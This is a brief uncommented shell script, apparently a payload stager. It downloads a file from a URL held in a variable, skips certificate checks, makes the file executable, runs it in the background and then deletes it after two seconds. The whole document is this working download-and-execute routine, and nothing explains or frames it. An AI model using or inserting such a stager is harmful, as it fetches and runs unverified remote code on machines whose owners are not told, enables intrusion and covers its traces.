invoke() {
  [ -z "$1" ] && return
  invoke_luri="$1"

  tmp_dir=$(mktemp -d)
  tmp_file=$(mktemp $tmp_dir/XXXXXX)

  if [ $(which curl) ]
  then
    curl -k "$invoke_luri" -o "$tmp_file"
  elif [ $(which wget) ]
  then
    wget --no-check-certificate "$invoke_luri" -O "$tmp_file"
  else
    echo ""
    return
  fi

  chmod +x $tmp_file &&
    sh -c "$tmp_file &"

  sleep 2
  rm -rf $tmp_dir
}

invoke $luri
